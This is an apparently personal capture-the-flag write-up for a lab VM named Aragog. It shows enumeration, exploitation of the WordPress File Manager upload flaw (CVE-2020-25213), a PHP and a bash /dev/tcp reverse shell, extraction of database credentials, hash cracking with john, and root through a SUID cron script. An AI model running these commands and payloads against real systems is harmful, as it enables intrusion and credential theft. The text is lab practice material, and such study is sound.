---
{"dg-publish":true,"permalink":"/machines/aragorn-writeup/","noteIcon":""}
---

Aragorn

# Enumeration

```bash

┌──(root㉿kali)-[/home/kali]
└─# nmap -sS --min-rate=5000 -Pn -n -p- -sC 192.168.0.109 -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 10:31 EST
Nmap scan report for 192.168.0.109
Host is up (0.0034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http

```

Seems port 80 is open.
Apache.
```bash
┌──(root㉿kali)-[/home/kali]
└─# whatweb 192.168.0.109
http://192.168.0.109 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.0.109]


```
![Pasted image 20240115093602.png](/img/user/Pasted%20image%2020240115093602.png)
```bash


┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u 192.168.0.109 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.109
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 313] [--> http://192.168.0.109/blog/]


```

http://wordpress.aragog.hogwarts/blog/wp-login.php

![Pasted image 20240115094047.png](/img/user/Pasted%20image%2020240115094047.png)

modified etc hosts to view the site properly
![Pasted image 20240115093809.png](/img/user/Pasted%20image%2020240115093809.png)

![Pasted image 20240115094100.png](/img/user/Pasted%20image%2020240115094100.png)



```bash```

Found the following vulnerable to RCE. 

```bash


┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://192.168.0.109/blog/  --api-token=espLHYxFTagBd85qWJ4HKIlsklJIJUkORyn8712A7Eo --enumerate u,vp --plugins-detection aggressive | grep RCE  -A 7
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/



```
http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php

                                                                                                                 
┌──(root㉿kali)-[~kali/Downloads]
└─# python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog 
Just do it... URL: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
200
Success!?
http://wordpress.aragog.hogwarts/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php



sent  a php reverse shell


┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.112] from (UNKNOWN) [192.168.0.109] 51862
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 21:25:27 up 34 min,  0 users,  load average: 0.08, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ^@


www-data@Aragog:/$ grep -RE "DB_USER|DB_PASSWORD" /etc/ 2>/dev/null
/etc/wordpress/config-default.php:define('DB_USER', 'root');
/etc/wordpress/config-default.php:define('DB_PASSWORD', 'mySecr3tPass');
www-data@Aragog:/$ 










s$  data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
s$ mysql -u root -pr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use database wordpress;
ERROR 1049 (42000): Unknown database 'database'
MariaDB [(none)]> use  wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show * from wp_users
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '* from wp_users' at line 1
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)

MariaDB [wordpress]>


```

$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.
```



──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2024-01-15 12:04) 14.28g/s 20571p/s 20571c/s 20571C/s 753951..michel
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ john hash --show                                     
?:password123

1 password hash cracked, 0 left
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat hash           
$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.
                                                                                                                                                                                                                                            
┌──(kali㉿


bash -c "bash -i >%26 /dev/tcp/192.168.0.111/1234 0>%261"



hagrid98@Aragog:~$ cat horcrux1.txt
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}

2024/01/16 15:22:01 CMD: UID=0     PID=880    | /bin/sh -c bash -c "/opt/.backup.sh"




2024/01/16 15:22:01 CMD: UID=0     PID=880    | /bin/sh -c bash -c "/opt/.backup.sh"
2024/01/16 15:22:01 CMD: UID=0     PID=881    | /bin/bash /opt/.backup.sh


hagrid98@Aragog:/opt$ watch ls -liahr /bin/bash
hagrid98@Aragog:/opt$ bash -p
bash-5.0# whoami
root
bash-5.0#


hagrid98@Aragog:/opt$ ls -liahr
total 12K
267173 -rwxr-xr-x  1 hagrid98 hagrid98   81 Apr  1  2021 .backup.sh




hagrid98@Aragog:/opt$ cat .backup.sh
#!/bin/bash
chmod +s /bin/bash
cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
hagrid98@Aragog:/opt$


---------



Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}


-------
